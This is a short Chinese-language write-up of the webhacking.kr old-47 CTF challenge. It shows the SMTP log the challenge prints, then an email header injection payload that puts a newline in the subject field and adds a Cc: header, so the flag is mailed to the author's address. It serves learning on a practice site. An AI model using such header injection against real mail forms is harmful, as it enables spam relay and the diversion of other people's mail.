# old-47_150

* 這一題一進去可以發現一個 email subject
* 直接送出，會顯示一些資訊
    ```=
    2020-07-03 21:42:01 CLIENT -> SERVER: EHLO webhacking.kr
    2020-07-03 21:42:01 CLIENT -> SERVER: STARTTLS
    2020-07-03 21:42:01 CLIENT -> SERVER: EHLO webhacking.kr
    2020-07-03 21:42:01 CLIENT -> SERVER: AUTH LOGIN
    2020-07-03 21:42:02 CLIENT -> SERVER: <credentials hidden>
    2020-07-03 21:42:02 CLIENT -> SERVER: <credentials hidden>
    2020-07-03 21:42:02 CLIENT -> SERVER: MAIL FROM:<no-reply@webhacking.kr>
    2020-07-03 21:42:02 CLIENT -> SERVER: RCPT TO:<no-existed@webhacking.kr>
    2020-07-03 21:42:02 CLIENT -> SERVER: DATA
    2020-07-03 21:42:03 CLIENT -> SERVER: Date: Sat, 4 Jul 2020 06:42:01 +0900
    2020-07-03 21:42:03 CLIENT -> SERVER: To: no-existed@webhacking.kr
    2020-07-03 21:42:03 CLIENT -> SERVER: From: no-reply@webhacking.kr
    2020-07-03 21:42:03 CLIENT -> SERVER: Subject: Flag of webhacking.kr old-47 chall
    2020-07-03 21:42:03 CLIENT -> SERVER: Message-ID: <yRsgo5VtPz9etw2ExTr92VymMUVyG6WBIKXxsIU25xQ@webhacking.kr>
    2020-07-03 21:42:03 CLIENT -> SERVER: MIME-Version: 1.0
    2020-07-03 21:42:03 CLIENT -> SERVER: Content-Type: text/plain; charset=iso-8859-1
    2020-07-03 21:42:03 CLIENT -> SERVER:
    2020-07-03 21:42:03 CLIENT -> SERVER: FLAG{?????}
    2020-07-03 21:42:03 CLIENT -> SERVER:
    2020-07-03 21:42:03 CLIENT -> SERVER: .
    2020-07-03 21:42:04 CLIENT -> SERVER: QUIT
    ```
* 這時，我想到了 ssrf
* 因為這個輸入匡中控制的是 subject 的部分，所以想辦法換行並且加上 To: your_email 說不定可以收到 flag
* 可以開 burp 或是單純的 textarea 標籤也可以做到相同的效果，不過要記得把 maxlength 變大一點
* 之後我嘗試輸入 
    ```
    Flag of webhacking.kr old-47 chall
    To: 39701965a@gmail.com
    ```
    不過我沒有收到 mail
* 所以我想到了[副本](https://www.thenewslens.com/article/6984)，所以我稍微改一下 payload
    ```
    Flag of webhacking.kr old-47 chall
    Cc: 39701965a@gmail.com
    ```
    然後就收到 flag 拉
